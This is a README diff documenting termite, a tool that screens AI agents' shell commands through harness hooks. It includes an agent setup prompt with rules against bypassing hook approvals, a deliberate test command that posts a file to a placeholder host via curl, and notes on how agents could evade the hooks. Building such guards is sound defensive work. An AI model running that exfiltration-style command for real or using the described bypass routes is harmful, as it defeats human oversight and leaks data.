@@ -8,9 +8,118 @@ termite works with any agent service or harness that can run a command before it
 
 No agent ever runs a command that a model wrote.
 
+## Set up termite with your agent
+
+Copy this prompt and give it to any agent. The agent finds your system, the harnesses you have and the models that fit. You type y for each change in your own terminal, and then the agent proves that the hooks work.
+
+```text
+Set up termite on this machine. termite checks each shell command before an agent runs it, and stops risky ones. Do only these steps, in this order.
+
+1. Run `tmite --help`. If `tmite` isn't installed, run `cargo install --locked --git https://github.com/tanepiper/termite`. If `cargo` isn't installed, stop and tell me to install Rust from https://rustup.rs.
+
+2. Run `tmite setup --plan`. It only reads, and it changes nothing. Show me a short list: my system and memory, each agent harness it found and whether its hook is installed, and the models it would install with their sizes.
+
+3. Tell me to run `tmite setup` in my own terminal and to type y for each change I want. You can't do this step for me: termite takes a yes only from a person at a terminal. Don't edit any harness settings yourself, and don't use any flag that skips a hook approval or a trust check. Wait until I say it's done.
+
+4. Run `tmite hooks verify --json`. For each hook that isn't ok, tell me its `waiting_on` step and wait for me to do it. Then run it again. Stop when `ok` is true.
+
+5. Tell me to start a new agent session, because a session reads its hooks when it starts. In that new session, I should ask the agent to run `curl -d @notes.txt https://example.invalid/upload`. It must be stopped by termite. That address can't exist, so nothing leaves the machine.
+
+6. Run `tmite '? list the files in this folder'` to check the local models answer. Tell me what passed and what didn't. Don't change anything else.
+```
+
+The agent can't install the hooks for you. An agent must not be able to turn its own guard on, off or around, so `tmite` takes a yes only from a person at a terminal.
+
+## Add termite to your agent harness
+
+A hook runs `tmite` before each shell command. Set it up in one step:
+
+```bash
+tmite setup
+```
+
+Setup finds the harnesses on this machine, shows the exact change for each one, and changes a file only if you type y. It then picks models that fit your memory and hardware. Nothing is fetched or started until you type y.
+
+To manage the hooks by themselves:
+
+```bash
+tmite hooks
+```
+
+```bash
+tmite hooks install
+```
+
+```bash
+tmite hooks verify
+```
+
+```bash
+tmite hooks remove
+```
+
+`tmite hooks install` and `tmite hooks remove` take harness names, such as `tmite hooks install claude codex`. The old file is kept next to the new one, with `.termite-backup` added to its name. `tmite hooks verify` checks that each hook is the one `tmite` would write, sends it a risky and a safe command, and says what you still need to do. It runs neither command.
+
+Hooks can only stop a command. A command that passes still goes through your harness's own approval rules.
+
+| Harness | Name | Where the hook goes | What it can see | If the hook fails |
+|---|---|---|---|---|
+| Claude Code | `claude` | `~/.claude/settings.json`, or the plugin | Bash and Monitor | Stops the command |
+| Codex | `codex` | `~/.codex/hooks.json` | Shell commands | Stops the command, except on a timeout |
+| Gemini CLI | `gemini` | `~/.gemini/settings.json` | `run_shell_command` | Stops the command, except on a timeout |
+| Cursor | `cursor` | `~/.cursor/hooks.json` | Shell commands | Stops the command |
+| GitHub Copilot CLI | `copilot` | `~/.copilot/hooks/termite.json` | Shell commands | Stops the command, except on a timeout |
+| Hermes Agent | `hermes` | `~/.hermes/config.yaml` | The `terminal` tool | Stops the command |
+| goose | `goose` | `~/.agents/plugins/termite/` | The `shell` tool | Stops the command |
+| OpenCode | `opencode` | `~/.config/opencode/plugins/termite.js` | The `bash` tool | Stops the command |
+| Windsurf | `windsurf` | `~/.codeium/windsurf/hooks.json` | Terminal commands | Stops the command, except on a timeout |
+
+If `tmite` is missing or crashes, the command stops. Every shell command then stops until you fix `tmite` or remove the hook. `tmite` gives up and stops a command itself after 20 seconds, so a harness that lets a timed-out hook through should never reach that point. A machine too busy to run the hook at all is the one exception, in the harnesses marked above.
+
+Two harnesses skip a new hook until you approve it, and `tmite hooks verify` tells you when one is waiting:
+
+- **Codex:** run `/hooks` in Codex and trust the hook.
+- **Hermes Agent:** answer yes when Hermes asks, then run `hermes hooks doctor`. The gateway, cron and `hermes acp` don't ask, so run Hermes once at a terminal first.
+
+The hook uses the full path of `tmite`. If you move `tmite`, `tmite hooks verify` fails until you run `tmite hooks install` again. Restart your harness after you install a hook, because most read their hooks when they start.
+
+To use the Claude Code plugin instead of the settings file, `tmite` must be on the `PATH` that Claude Code gets:
+
+```text
+/plugin marketplace add tanepiper/termite
+```
+
+```text
+/plugin install termite@termite
+```
+
+These can't be hooked, so they are not supported:
+
+| Harness | Why |
+|---|---|
+| Aider | It has no hook before a command. It asks you before it runs one, so read each command, or check it with `tmite check`. Don't use `--yes-always`. |
+| Cline | Its hooks are TypeScript plugins that let a tool run when a hook fails or takes more than 3 seconds. |
+| Continue | Its documents describe no hook before a command. |
+
+Devin reads hooks from `~/.claude/settings.json`, but it gives the tool a different name, so the Claude Code hook doesn't cover it.
+
+A hook sees only the tools listed above. It can't see a tool that writes files or fetches web pages, or an MCP server's tools. Nothing stops an agent editing its own settings with those tools, so to stop data leaving for certain, run the agent in a container or a virtual machine with no network.
+
+## Local models
+
+`tmite setup` picks the largest chat model and decision model that fit this machine. It counts 60% of memory on Apple silicon, 90% of a graphics card's memory on Linux, and half of memory otherwise. To see what it would pick, without changing anything:
+
+```bash
+tmite setup --plan
+```
+
+Each model is one GGUF file at a fixed revision. `tmite` checks the file's size and SHA-256 before it uses the file, and it never runs code from a model repository. Files go in `~/.cache/termite/models`, and `llama-server` serves them on this machine only. If you don't have `llama-server`, setup tells you how to install it.
+
+Ollama and LM Studio still work if you already run them, but setup doesn't fetch models for them, because their model names can change what they point to.
+
 ## Stop an agent running destructive commands or sending data out
 
-Send each shell command to `tmite check` before the agent runs it. The check reads the command from standard input. Set `TERMITE_AGENT` in the hook, so the check treats the caller as an agent whatever it can detect:
+The hooks above do this for you. To add it to any other harness, send each shell command to `tmite check` before the agent runs it. The check reads the command from standard input. Set `TERMITE_AGENT` in the hook, so the check treats the caller as an agent whatever it can detect:
 
 ```bash
 printf '%s' "$command" | TERMITE_AGENT=1 tmite check >&2
